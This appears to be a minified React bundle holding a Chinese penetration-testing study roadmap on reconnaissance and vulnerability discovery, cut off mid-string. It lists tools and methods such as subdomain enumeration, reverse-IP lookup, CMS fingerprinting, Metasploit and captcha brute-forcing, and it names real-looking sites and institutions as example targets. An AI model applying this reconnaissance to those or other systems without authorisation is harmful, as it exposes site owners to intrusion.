\u53D1\u73B0\u66F4\u591A\u672A\u77E5\u7684\u5E94\u7528")),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"QQ\u6216\u5FAE\u4FE1\u7FA4"),u.a.createElement("li",null,"\u5DE5\u4F5C\u7FA4\uFF08\u9489\u9489\uFF09\u7B49"),u.a.createElement("li",null,"\u5176\u4ED6\u901A\u8BAF\u7FA4\u804A\u7B49")))}]}]},T=u.a.createElement(u.a.Fragment,null,u.a.createElement("br",null),"\u8865\u5145\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6309\u7167 \u56FE\u7247\u6307\u7EB9 \u641C"),u.a.createElement("li",null,"\u6309\u7167 \u6E90\u7801\u6307\u7EB9 \u641C")),"\u4E2A\u4EBA\u518D\u8865\u5145\u4FE1\u606F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6E90\u7801\u6536\u96C6\u3001\u539F\u7406\u5256\u6790\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,E("\u4E92\u8054\u7F51\u516C\u53F8\u5E38\u7528\u6846\u67B6\u6E90\u7801\u8D4F\u6790","https://github.com/doocs/source-code-hunter")))))),R={name:"\u4FE1\u606F\u6536\u96C6",desc:"\u4FE1\u606F\u6536\u96C6",steps:[x,{name:"WEB / \u67B6\u6784\u3001\u642D\u5EFA\u3001WAF\uFF0C\u7B49",desc:u.a.createElement(u.a.Fragment,null,F("\u76EE\u6807\u591A\u673A\u4F1A\u5927")),steps:[{name:"CMS\u8BC6\u522B\u6280\u672F",desc:u.a.createElement(u.a.Fragment,null,F("\u63A5\u57FA\u7840\u5165\u95E8\u601D\u8DEF"),u.a.createElement("br",null),T),content:u.a.createElement(u.a.Fragment,null,"\u300A\u57FA\u7840\u5165\u95E8\u300B \u524D\u9762\u8BB2\u4E86")},{name:"\u6E90\u7801\u83B7\u53D6\u6280\u672F",desc:u.a.createElement(u.a.Fragment,null,F("\u63A5\u57FA\u7840\u5165\u95E8\u601D\u8DEF"),u.a.createElement("br",null),T),content:u.a.createElement(u.a.Fragment,null,"\u300A\u57FA\u7840\u5165\u95E8\u300B \u524D\u9762\u8BB2\u4E86")},{name:"\u3010\u7EC4\u6210\u67B6\u6784\u6A21\u578B - \u56DB\u4E2A\u90E8\u5206\u3011\u4FE1\u606F\u83B7\u53D6",desc:u.a.createElement(u.a.Fragment,null,F("\u6811\u7ACB\u7B80\u8981\u601D\u8DEF"),u.a.createElement("br",null),u.a.createElement("br",null),"\u7F51\u7AD9\u6E90\u7801\u3001\u64CD\u4F5C\u7CFB\u7EDF\u3001\u4E2D\u95F4\u4EF6\uFF08\u642D\u5EFA\u5E73\u53F0\uFF09\u3001\u6570\u636E\u5E93"),content:u.a.createElement(u.a.Fragment,null,"\u300A\u57FA\u7840\u5165\u95E8\u300B \u524D\u9762\u8BB2\u4E86",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7F51\u7AD9\u6E90\u7801",u.a.createElement("ol",null,u.a.createElement("li",null,T))),u.a.createElement("li",null,"\u64CD\u4F5C\u7CFB\u7EDF",u.a.createElement("ol",null,u.a.createElement("li",null,"Windows"),u.a.createElement("li",null,"Linux"))),u.a.createElement("li",null,"\u4E2D\u95F4\u4EF6\uFF08\u642D\u5EFA\u5E73\u53F0\uFF09",u.a.createElement("ol",null,u.a.createElement("li",null,"Nginx\u3001Tengine"),u.a.createElement("li",null,"Docker\u4E5F\u7B97"))),u.a.createElement("li",null,"\u6570\u636E\u5E93")))},{name:"\u7AD9\u70B9\u642D\u5EFA\u5206\u6790",desc:u.a.createElement(u.a.Fragment,null,"99%\u7684\u4E60\u60EF",u.a.createElement("br",null),F("\u76EE\u6807\u591A\u673A\u4F1A\u5927"),u.a.createElement("br",null)),steps:[{name:"\u3010\u4E60\u60EF\u3011 \u76EE\u5F55\u578B\u7AD9\u70B9",content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"sti.blcu.edu.cn\uFF0C \u4E00\u4E2A\u67B6\u6784"),u.a.createElement("li",null,"sit.blcu.edu.cn/bbs\uFF0C discuz\u67B6\u6784")),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u901A\u8FC7 \u76EE\u5F55\u626B\u63CF\u3001\u722C\u884C\u5DE5\u5177 \u90FD\u53EF\u4EE5\u5F97\u5230"),u.a.createElement("li",null,"\u5728\u4E0A\u9762\u7684\u4EE5\u540E\uFF0C\u6709\u65F6\u5019 \u3010\u901A\u8FC7\u70B9\u51FB\u3011 \u4E5F\u53EF\u4EE5\u5F97\u5230")))},{name:"\u3010\u4E60\u60EF\u3011 \u7AEF\u53E3\u7C7B\u7AD9\u70B9",content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"web.0516jz.com:80"),u.a.createElement("li",null,"web.0516jz.com:8080"),u.a.createElement("li",null,"web.0516jz.com:83"),u.a.createElement("li",null,"web.0516jz.com:89"),u.a.createElement("li",null,"web.0516jz.com:8888")),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u626B\u63CF"),u.a.createElement("li",null,"\u9ED1\u6697\u5F15\u64CE \uFF08\u6211\u81EA\u5DF1\u8865\u5145\u7684\uFF09",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(g.\u7AEF\u53E3_\u6536\u96C6)))))},{name:"\u3010\u4E60\u60EF\u3011 \u5B50\u57DF\u540D\u7AD9\u70B9",content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"www.goodlift.net"),u.a.createElement("li",null,"bbs.goodlift.net")),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u53C2\u7167\u3010\u5B50\u57DF\u540D\u3011\u7684\u65B9\u5F0F"),u.a.createElement("li",null,"\u901A\u8FC7 /robots.txt \uFF0C\u6709\u65F6\u53EF\u4EE5\u83B7\u53D6\u3010CMS\u7C7B\u578B\u3011",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5982 DESTOON B2B")))))},{name:"\u3010\u4E60\u60EF\u3011 \u7C7B\u4F3C\u57DF\u540D\u7AD9\u70B9",content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"jmlsd.cn"),u.a.createElement("li",null,"jmlsd.com"),u.a.createElement("li",null,"www.axgc168.com")),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5404\u79CD\u5E38\u7528\u57DF\u540D\u540E\u7F00 cn\u3001net\u3001com \u7B49")))},{name:"\u3010\u4E60\u60EF\u3011 \u65C1\u6CE8_\u53CD\u67E5IP\u3001C\u6BB5\u7AD9\u70B9",desc:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4EE5\u524D\u4F7F\u7528\u7684\u5F88\u591A\u7684",u.a.createElement("ol",null,u.a.createElement("li",null,"\u73B0\u5728\uFF0C\u53EF\u80FD\u56E0\u4E3A\u5927\u5BB6\u90FD\u61C2\u4E86"),u.a.createElement("li",null,"\u601D\u8DEF\u6CA1\u6709\u4EE5\u524D\u597D\u7528\u4E86"))),u.a.createElement("li",null,"\u4E0D\u7BA1\u600E\u4E48\u6837\uFF0C\u8FD8\u662F\u8981\u5B66\u4E60\u7684",u.a.createElement("ol",null,u.a.createElement("li",null,"\u591A\u4E00\u79CD\u65B9\u6CD5\uFF0C\u591A\u4E00\u79CD\u53EF\u80FD\u6027"))))),content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u67E5\u8BE2\u9776\u573A \u540C\u670D\u52A1\u5668\u7AD9\u70B9"),u.a.createElement("li",null,"weipan\u641C\u7D22\u3010qqyewu.com\u3011")),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u65C1\u6CE8_\u53CD\u67E5IP",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011\u65C1\u6CE8_\u53CD\u67E5IP_\u5DE5\u5177"])))))},{name:"\u3010\u4E60\u60EF\u3011 \u642D\u5EFA\u8F6F\u4EF6\u7279\u5F81\u7AD9\u70B9",desc:u.a.createElement(u.a.Fragment,null,"\u4E60\u60EF \u662F\u5F88\u91CD\u8981\u7684 ",u.a.createElement("br",null),"\u3010\u642D\u5EFA\u5957\u4EF6\u3011\uFF0C\u4E00\u7CFB\u5217 \u6709\u975E\u5E38\u660E\u663E\u7684\u7279\u5F81\u3002 ",u.a.createElement("br",null)),content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u624B\u52A8",u.a.createElement("ol",null,u.a.createElement("li",null,"\u81EA\u5DF1\u642D\u5EFA\uFF0C\u4E00\u6B65\u6B65\u8C03\u8BD5"))),u.a.createElement("li",null,"\u4E00\u4F53\u5316\u7684\u642D\u5EFA\u8F6F\u4EF6 \uFF0C\u8D8A\u6765\u8D8A\u8F6C\u79FB\u5230\u8FD9\u4E00\u5757\u3002\u5F88\u5E38\u89C1",u.a.createElement("ol",null,u.a.createElement("li",null,"phpStudy"),u.a.createElement("li",null,"\u5B9D\u5854 - \u4E00\u952E\u642D\u5EFA \uFF08\u6BD4\u5982 \u7AEF\u53E3 8888\uFF09"),u.a.createElement("li",null,"wmap"),u.a.createElement("li",null,"lnmap"))),u.a.createElement("li",null,"\u3010\u4E00\u4F53\u5316\u3011\u642D\u5EFA \u4E0E \u5E38\u89C4\u642D\u5EFA \u7684\u533A\u522B",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E2D\u95F4\u4EF6\u7684\u7ED3\u679C",u.a.createElement("ol",null,u.a.createElement("li",null,"http\u8BF7\u6C42\u8FD4\u56DE"),u.a.createElement("li",null,"Header\u7684 Server\u5B57\u6BB5"),u.a.createElement("li",null,"phpStudy \u2014\u2014 Apche/ OpenSSL/ PHP/"),u.a.createElement("li",null,"\u5B9D\u5854 \u2014\u2014 Apache/ OpenSSL mod_fcgid/"))),u.a.createElement("li",null,"(\u663E\u793A)\u5F88\u5168\u7684\uFF0C\u4E00\u822C\u5C31\u662F \u642D\u5EFA\u8F6F\u4EF6")))))}]},h.WAF\u9632\u62A4\u5206\u6790]},{name:"APP \u53CA \u5176\u4ED6\u8D44\u4EA7\uFF0C\u7B49",desc:u.a.createElement(u.a.Fragment,null,"\u601D\u8DEF\uFF0C\u6309\u7167\u4E4B\u524D\u7684\u3010\u603B\u4F53\u601D\u8DEF\u3011",u.a.createElement("br",null),u.a.createElement("br",null),"(\u5C55\u793A\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u6CA1\u6709\u6BCF\u4E2AIP\u53BB\u626B)",u.a.createElement("br",null),"\u771F\u5B9E\u8FC7\u7A0B\u4E2D\uFF0C\u4E3A\u4E86\u53D1\u73B0\u673A\u4F1A\uFF0C\u6BCF\u4E2AIP\u90FD\u5E94\u8BE5\u53BB\u626B\u4E00\u904D\u7684",u.a.createElement("br",null)),steps:[{name:"ApkAnalyzer\uFF0C\u89E3\u5305",content:u.a.createElement(u.a.Fragment,null,"\u83B7\u53D6 \u611F\u5174\u8DA3\u7684url",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u4F7F\u7528",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.ApkAnalyzer_\u89E3\u5305_\u9006\u5411\u5DE5\u5177)))},{name:"BurpSuite\u6293\u5305  \u83B7\u53D6url",content:u.a.createElement(u.a.Fragment,null,"\u83B7\u53D6url",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6293\u5305\u5230 \u5404\u4E2A\u7F51\u7AD9\u57DF\u540D"),u.a.createElement("li",null,"\u518D \u6309\u7167 \u300AWeb\u300B \u7684\u601D\u8DEF"),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.BurpSuite_\u6293\u5305\u5DE5\u5177)))},{name:"\u5BF9 url \u8FDB\u884C\u5206\u6790",steps:[{name:"\u601D\u8DEF",steps:[{name:"\u7AEF\u53E3\u4E00\u987F\u4E71\u626B",content:u.a.createElement(u.a.Fragment,null,"\u53EF\u89C1 \u300A\u6F0F\u6D1E\u53D1\u73B0\u300B")},{name:"\u63A5\u53E3\u4E00\u987F\u4E71\u626B",content:u.a.createElement(u.a.Fragment,null,"\u5177\u4F53\u662F\u6307\uFF1F\uFF1F\uFF1F\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026 SqlMap\u5417\uFF1F")},{name:"\u90E8\u5206\u63A5\u53E3\u8FDB\u884C\u6D4B\u8BD5",content:u.a.createElement(u.a.Fragment,null,"\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")}]},g.\u57FA\u672C,c.nmap_\u7EFC\u5408\u5DE5\u5177.\u57FA\u672C]},{name:"\u67E5\u5907\u6848",desc:u.a.createElement(u.a.Fragment,null,"\u67E5\u53E6\u5916\u7684\u7AD9"),content:u.a.createElement(u.a.Fragment,null,"\u5728\u522B\u7684\u5730\u65B9\u63D0\u5230\u4E86",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u76F8\u5173\u5DE5\u5177\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4.\u57DF\u540D["\u3010\u7EC4\u3011\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49"])))},{name:"\u5B50\u57DF\u540D",desc:c.\u7EC4["\u3010\u7EC4\u3011\u5B50\u57DF\u540D\u5DE5\u5177"].desc,content:u.a.createElement(u.a.Fragment,null,"\u76F8\u5173\u5DE5\u5177\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011\u5B50\u57DF\u540D\u5DE5\u5177"])))},{name:"\u65C1\u6CE8_\u53CD\u67E5IP",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011\u65C1\u6CE8_\u53CD\u67E5IP_\u5DE5\u5177"])))},{name:"\u76F8\u5173\u5173\u952E\u8BCD",desc:u.a.createElement(u.a.Fragment,null,"\u5982\uFF1A\u67E5\u51EF\u513F\u5F97\u4E50 \u4F20\u9500\u7F51\u7AD9\uFF0C\u4E00\u822C\u4F1A\u7ECF\u5E38\u66F4\u6362\u5730\u65B9"),content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026")}]},{name:"\u8D44\u4EA7\u76D1\u63A7  \u62D3\u5C55",steps:[j.Github\u76D1\u63A7,B.\u4E2D\u95F4\u4EF6_\u5E38\u7528\u6F0F\u6D1E,{name:"\u9ED1\u6697\u5F15\u64CE\uFF0C\u5B9E\u73B0  \u57DF\u540D\u7AEF\u53E3  \u6536\u96C6",steps:[g.\u57DF\u540D_\u6536\u96C6,g.\u7AEF\u53E3_\u6536\u96C6]},{name:"\u5168\u81EA\u52A8\u57DF\u540D  \u6536\u96C6\u3001\u679A\u4E3E",steps:[c.teemo_\u5168\u81EA\u52A8\u57DF\u540D_\u5B50\u57DF\u540D_\u6536\u96C6\u5DE5\u5177,c.Layer_\u5B50\u57DF\u540D_\u6316\u6398\u673A_\u5DE5\u5177,c.\u706F\u5854ARL_\u5168\u81EA\u52A8_\u6240\u6709\u8D44\u4EA7\u6536\u96C6_\u5DE5\u5177]},{name:"\u5168\u81EA\u52A8\uFF0C\u901A\u7528\u8D44\u4EA7\u6536\u96C6",steps:[c.\u706F\u5854ARL_\u5168\u81EA\u52A8_\u6240\u6709\u8D44\u4EA7\u6536\u96C6_\u5DE5\u5177]},{name:"\u3010SRC\u76EE\u6807 / \u5382\u5546\u76EE\u6807\u3011\u4E2D\u7684\uFF0C\u4FE1\u606F\u6536\u96C6\u5168\u8986\u76D6",steps:[{name:"\u6D4B\u8BD5\u4F8B\u5B50",content:u.a.createElement(u.a.Fragment,null,"\u8865\u5929",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6D59\u6C5F\u65C5\u6E38\u5B66\u9662"),u.a.createElement("li",null,"(\u6362\u4E00\u4E2A\u96BE\u5EA6\u9AD8\u4E00\u70B9\u7684) \u4E0A\u6D77\u76F4\u5CA9",u.a.createElement("ol",null,u.a.createElement("li",null,"\u627E\u51FA\u540E\u53F0"),u.a.createElement("li",null,"\u627E\u51FA\u3010\u65E0\u9A8C\u8BC1\u7801\u3011"),u.a.createElement("li",null,"\u627E\u51FA\u3010\u9A8C\u8BC1\u7801\u7206\u7834\u3011"),u.a.createElement("li",null,"\u627E\u51FA\u3010Jenkins\u3011")))))},O.\u8303\u56F4\u9605\u8BFB_\u5B50\u57DF\u540D\u76F8\u5173]},{name:"\u5229\u7528\u7B2C\u4E09\u65B9\u63A5\u53E3",desc:u.a.createElement(u.a.Fragment,null,"\u7B2C\u4E09\u65B9\u63A5\u53E3_\u5176\u5B9E\u66F4\u65B0\u7684\u633A\u5FEB_\u8FD9\u91CC\u90FD\u662F\u4E0D\u5168\u7684"),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011\u7B2C\u4E09\u65B9\u63A5\u53E3"])))},_.\u57FA\u672C\u4ECB\u7ECD]}]},s={name:"\u6F0F\u6D1E\u53D1\u73B0",desc:"\u6F0F\u6D1E\u53D1\u73B0",steps:[{name:"\u64CD\u4F5C\u7CFB\u7EDF",desc:u.a.createElement(u.a.Fragment,null,"\uFF08\u8865\u5145\uFF09\u8981\u601D\u8003\u6E05\u695A\u7684\u95EE\u9898",u.a.createElement("ol",null,u.a.createElement("li",null,"1. \u7CFB\u7EDF\u6F0F\u6D1E \u53D1\u73B0\u610F\u4E49 \uFF1F"),u.a.createElement("li",null,"2. \u6F0F\u6D1E\u7C7B\u578B \u5371\u5BB3\u60C5\u51B5 \uFF1F"),u.a.createElement("li",null,"3. \u5982\u4F55\u505A\u597D \u672A\u535C\u5148\u77E5 \uFF1F"))),steps:[c.\u7EC4["\u3010\u7EC4\u3011\u64CD\u4F5C\u7CFB\u7EDF_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177"],{name:"\u3010\u6F0F\u6D1E\u3011 \u7C7B\u578B",content:u.a.createElement(u.a.Fragment,null,"\u603B\u4F53\u800C\u8A00",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6743\u9650\u63D0\u5347\u3001\u8FDC\u7A0B\u6267\u884C\u3001\u84DD\u5C4F\u3001\u5D29\u6E83\uFF0C\u7B49")),"\u5206\u7C7B",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDC\u7A0B\u6267\u884C"),u.a.createElement("li",null,"\u6743\u9650\u63D0\u5347"),u.a.createElement("li",null,"\u7F13\u51B2\u533A\u6EA2\u51FA")))},{name:"\u3010\u6F0F\u6D1E\u3011 \u5229\u7528",steps:[{name:"\u5DE5\u5177\u6846\u67B6",steps:[c.MetaSploit_\u6F0F\u6D1E_\u5DE5\u5177\u6846\u67B6,c.SearchSploit_\u6F0F\u6D1E_\u5DE5\u5177\u6846\u67B6]},b.\u96C6\u4E2D_\u67E5\u8BE2\u7F51\u7AD9_\u53CA\u6F0F\u6D1E\u5E93,b.\u96F6\u6563_\u590D\u73B0\u6587\u7AE0]},{name:"\u3010\u6F0F\u6D1E\u3011 \u4FEE\u590D",content:u.a.createElement(u.a.Fragment,null,"\u65B9\u5F0F",u.a.createElement("ol",null,u.a.createElement("li",null,a.\u4FEE\u590D.\u6253\u597D\u8865\u4E01),u.a.createElement("li",null,a.\u4FEE\u590D.\u5173\u95ED\u5165\u53E3),u.a.createElement("li",null,a.\u4FEE\u590D["\u90E8\u7F72WAF / \u9632\u62A4\u5E94\u7528"])))}]},{name:"WEB\u5E94\u7528",steps:[{name:"\u5DF2\u77E5CMS",desc:u.a.createElement(u.a.Fragment,null,"\u5982",u.a.createElement("ol",null,u.a.createElement("li",null,"dedecms\uFF08\u7EC7\u68A6\uFF09"),u.a.createElement("li",null,"discuz"),u.a.createElement("li",null,"wordpress"))),steps:[{name:"\u6F0F\u6D1E\u5E73\u53F0",steps:[b.\u96C6\u4E2D_\u67E5\u8BE2\u7F51\u7AD9_\u53CA\u6F0F\u6D1E\u5E93]},c.\u7EC4["\u3010\u7EC4\u3011CMS\u63A2\u9488\u5DE5\u5177_\u6846\u67B6"],{name:"\u4EE3\u7801\u5BA1\u8BA1",steps:[y.\u4EE3\u7801\u5BA1\u8BA1_\u5DE5\u5177.\u603B\u548C,{name:"\u51FD\u6570\u70B9 \u6316\u6398",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026")},{name:"\u529F\u80FD\u70B9 \u6316\u6398",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026")},{name:"\u6846\u67B6\u7C7B \u6316\u6398",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026")}]}]},{name:"\u5F00\u53D1\u6846\u67B6",steps:[y.\u8BED\u8A00.\u8BED\u8A00_PHP,y.\u8BED\u8A00.\u8BED\u8A00_Java,y.\u8BED\u8A00.\u8BED\u8A00_Python]},{name:"\u672A\u77E5CMS",steps:[c.\u7EC4["\u3010\u7EC4\u3011WEB\u5E94\u7528_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177"],c.\u624B\u52A8\u67E5\u8BE2.\u4EBA\u5DE5\u63A2\u9488_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF]},{name:"\u7AEF\u53E3\u3001IP\u3001\u57DF\u540D",desc:u.a.createElement(u.a.Fragment,null,"\u4ECE\u540E\u9762\u7684 \u8865\u5145\u77E5\u8BC6 \u800C\u6765"),steps:[{name:"\u7AEF\u53E3\u4E0D\u540C",content:u.a.createElement(u.a.Fragment,null,"\u4F8B\u5B50",u.a.createElement("ol",null,u.a.createElement("li",null,"xx.com"),u.a.createElement("li",null,"xx.com:8080")))},{name:"IP\u8BBF\u95EE \u548C \u57DF\u540D\u8BBF\u95EE\uFF0C\u7684\u5DEE\u522B",content:u.a.createElement(u.a.Fragment,null,"\u5DEE\u522B",u.a.createElement("ol",null,u.a.createElement("li",null,"\u57DF\u540D\u7F51\u7AD9 \u548C IP\u7F51\u7AD9\uFF0C\u6307\u5411\u7684\u53EF\u80FD\u662F \u4E0D\u540C\u7684\u4E0A\u4E0B\u7EA7\u76EE\u5F55",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709\u65F6\u5019\uFF0C\u53EF\u4EE5\u62FF zip\u5907\u4EFD\u6587\u4EF6 \uFF0Cweb.zip")))),"\u4F8B\u5B50",u.a.createElement("ol",null,u.a.createElement("li",null,"101.99.50.38")))},{name:"\u57DF\u540D \u67E5\u627E",steps:[{name:"\u6CE8\u518C\u4EBA",desc:u.a.createElement(u.a.Fragment,null,"\u540C\u4E00\u4E2A\u4EBA\u624B\u4E0B\uFF0C\u6709\u54EA\u4E9B\u57DF\u540D"),steps:[c.\u7EC4.\u57DF\u540D["\u3010\u7EC4\u3011\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49"]]},{name:"\u57DF\u540D\u767B\u8BB0",desc:u.a.createElement(u.a.Fragment,null,"\u54EA\u4E9B\u57DF\u540D\uFF0C\u662F\u5DF2\u7ECF\u5B58\u5728\u7684"),steps:[c.\u7EC4.\u57DF\u540D["\u3010\u7EC4\u3011\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49"]]},{name:"\u5176\u5B83\u7279\u6709\u4FE1\u606F (\u7F51\u7AD9\u7279\u6709)",desc:u.a.createElement(u.a.Fragment,null,"\u53EF\u80FD \u540C\u4E00\u6279 \u590D\u7528"),steps:[{name:"\u5173\u952E\u5B57",desc:u.a.createElement(u.a.Fragment,null,"\u53EF\u80FD \u540C\u4E00\u6279 \u590D\u7528")},{name:"\u6807\u9898",desc:u.a.createElement(u.a.Fragment,null,"\u53EF\u80FD \u540C\u4E00\u6279 \u590D\u7528")},{name:"\u4E0D\u540C\u540D\u79F0\u7684\u62FC\u97F3",desc:u.a.createElement(u.a.Fragment,null,"\u548C \u300A\u3010\u4E60\u60EF\u3011 \u7C7B\u4F3C\u57DF\u540D\u7AD9\u70B9\u300B\u7BC7 \u6709\u4E00\u5B9A\u8054\u7CFB"),content:u.a.createElement(u.a.Fragment,null,"\u6BD4\u5982",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7231\u5FC3\u5DE5\u7A0B \u2014\u2014> \u62FC\u97F3\u4E3Aaxgc")))}]}]}]},{name:"WSDL\uFF0C\u7F51\u7EDC\u670D\u52A1\u63CF\u8FF0\u8BED\u8A00",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u662F\u4E00\u79CD\u6BD4\u8F83 \u91CD \u548C \u8001 \u7684Web\u63A5\u53E3\u6280\u672F\u3002"),u.a.createElement("li",null,"\u5E38\u89C1\u9879\u76EE",u.a.createElement("ol",null,u.a.createElement("li",null,"\u91D1\u878D\u673A\u6784\u7684\u5386\u53F2\u5E94\u7528"),u.a.createElement("li",null,"\u6BD4\u8F83\u8001\u7684\u5E94\u7528")))),"\u6F0F\u6D1E\u5173\u952E\u5B57",u.a.createElement("ol",null,u.a.createElement("li",null,"inurl:xxxx?wsdl")),"\u6D4B\u8BD5\u5DE5\u5177\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.Soap_UI_PRO_\u4E0D\u77E5\u9053\u662F\u5565\u7684\u6D4B\u8BD5\u5DE5\u5177),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.awvs_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF)))}]},{name:"APP\u5E94\u7528",desc:u.a.createElement(u.a.Fragment,null,"\u601D\u8DEF\u8BF4\u660E",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E00\u3001 \u53CD\u7F16\u8BD1\u63D0\u53D6URL \u6216 \u6293\u5305\u83B7\u53D6URL\uFF0C\u8FDB\u884CWEB\u5E94\u7528\u6D4B\u8BD5\uFF0C"),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"\u4E8C\u3001 \u5982\u4E0D\u5B58\u5728 \u6216 \u8D70\u5176\u4ED6\u534F\u8BAE\u7684\u60C5\u51B5\u4E0B\uFF0C\u9700\u91C7\u7528\u7F51\u7EDC\u63A5\u53E3\u6293\u5305 \u8FDB\u884C\u6570\u636E\u83B7\u53D6"),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"\u4E09\u3001 \u8F6C\u81F3 \u5176\u4ED6\u534F\u8BAE \u5B89\u5168\u6D4B\u8BD5"))),steps:[c.\u7EC4["\u3010\u7EC4\u3011\u624B\u673A\u6A21\u62DF\u5668"],c.\u7EC4["\u3010\u7EC4\u3011\u603B\u548C_\u6293\u5305\u5DE5\u5177"],{name:"\u534F\u8BAE",steps:[{name:"WEB \u534F\u8BAE\u7C7B",desc:u.a.createElement(u.a.Fragment,null,"\u6309 \u4E0A\u8FF0\u3010\u6F0F\u6D1E\u53D1\u73B0 \u2014\u2014 WEB\u5E94\u7528\u3011 \u7684\u601D\u8DEF\u3002")},{name:"\u5176\u4ED6 \u534F\u8BAE\u7C7B",desc:u.a.createElement(u.a.Fragment,null,"\u6309 \u4E0B\u8FF0 \u601D\u8DEF",u.a.createElement("ol",null,u.a.createElement("li",null,"\u3010\u4FE1\u606F\u6536\u96C6 \u2014\u2014 APP \u53CA \u5176\u4ED6\u8D44\u4EA7\uFF0C\u7B49\u3011"),u.a.createElement("li",null,"\u3010\u6F0F\u6D1E\u53D1\u73B0 \u2014\u2014 API\u63A5\u53E3\u670D\u52A1\u3011")))}]},{name:"\u9006\u5411",steps:[{name:"\u4E00\u952E\u63D0\u53D6APK  \u6D89\u53CAURL",content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.ApkAnalyzer_\u89E3\u5305_\u9006\u5411\u5DE5\u5177)))},{name:"\u53CD\u7F16\u8BD1  \u91CD\u5199\u4EE3\u7801\u6BB5  